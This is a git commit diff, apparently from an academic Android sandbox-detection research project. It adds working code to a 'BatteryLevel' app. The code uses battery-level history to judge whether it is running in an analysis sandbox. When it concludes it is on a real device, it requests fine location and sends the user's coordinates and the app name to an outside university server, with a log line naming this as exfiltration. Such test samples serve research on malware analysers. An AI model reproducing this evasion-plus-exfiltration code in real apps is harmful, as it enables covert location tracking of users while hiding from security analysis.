9c3c1a91b38c93dfd276b130a9fd61832544b84f
Timme Bethe <timme@timmebethe.nl>
2021-06-03 11:23:29 +0200

    Implemented actual leaking in BatteryLevel
    - Updated all dependencies
    - Added leaking location

--- sandbox-detection/BatteryLevel/app/src/main/java/nl/tbethe/shadowdroid/batterylevel/MainActivity.kt
+++ sandbox-detection/BatteryLevel/app/src/main/java/nl/tbethe/shadowdroid/batterylevel/MainActivity.kt
@@ -1,14 +1,27 @@
 package nl.tbethe.shadowdroid.batterylevel
 
+import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
+import android.location.Criteria
+import android.location.LocationManager
 import android.os.BatteryManager
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.edit
+import io.ktor.client.*
+import io.ktor.client.engine.cio.*
+import io.ktor.client.request.forms.*
+import io.ktor.client.statement.*
+import io.ktor.http.*
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 private const val TAG = "MainActivity"
 private const val BELOW_THRESHOLD = "batteryLevelBelow"
@@ -28,7 +41,24 @@ class MainActivity : AppCompatActivity() {
         val above = prefs.getBoolean(ABOVE_THRESHOLD, false)
         val below = prefs.getBoolean(BELOW_THRESHOLD, false)
 
-        if (above && below) leak()
+        leakLocationIf(above && below)
+    }
+
+    override fun onStart() {
+        super.onStart()
+
+        val batteryLevel = queryBatteryLevel()
+        batteryLevel?.let { lvl ->
+            when {
+                lvl < 40 -> prefs.edit {
+                    putBoolean(BELOW_THRESHOLD, true)
+                }
+                lvl > 60 -> prefs.edit {
+                    putBoolean(ABOVE_THRESHOLD, true)
+                }
+                else -> return@let
+            }
+        }
     }
 
     override fun onResume() {
@@ -37,20 +67,15 @@ class MainActivity : AppCompatActivity() {
         val batteryLevel = queryBatteryLevel()
         batteryLevel?.let { lvl ->
             when {
-                lvl < 35 -> prefs.edit {
+                lvl < 40 -> prefs.edit {
                     putBoolean(BELOW_THRESHOLD, true)
                 }
-                lvl > 65 -> prefs.edit {
+                lvl > 60 -> prefs.edit {
                     putBoolean(ABOVE_THRESHOLD, true)
                 }
                 else -> return@let
             }
         }
-    }
-
-    private fun leak() {
-        Log.d(TAG, "Leaking data")
-        TODO("Leak data")
     }
 
     /**
@@ -64,6 +89,52 @@ class MainActivity : AppCompatActivity() {
             val level: Int = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
             val scale: Int = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
             (level / scale) * 100
+        }
+    }
+
+    private fun leakLocationIf(notAnalyser: Boolean) {
+        if (!notAnalyser) return
+
+        fun sendLocation() {
+            val lm = getSystemService(LocationManager::class.java)
+            val provider = lm.getBestProvider(Criteria(), true)
+
+            val location = provider?.let {
+                lm.getLastKnownLocation(it)
+            }
+            location?.let { loc ->
+                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak?appname="
+                CoroutineScope(Dispatchers.IO).launch {
+                    try {
+                        HttpClient(CIO).use { client ->
+                            val response = client.submitForm<HttpResponse>(
+                                url,
+                                Parameters.build {
+                                    append("appname", packageName)
+                                    append("coords", "${loc.latitude}:${loc.longitude}")
+                                },
+                                false
+                            )
+                            Log.d(TAG, "Response status: ${response.status}")
+                            Log.d(TAG, "Response: ${response.readText()}")
+                        }
+                    } catch (e: Exception) {
+                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
+                    }
+                }
+            }
+        }
+        val requestPermission =
+            registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
+                if (isGranted) sendLocation()
+            }
+        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
+            PackageManager.PERMISSION_DENIED -> {
+                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
+            }
+            PackageManager.PERMISSION_GRANTED -> {
+                sendLocation()
+            }
         }
     }
 }
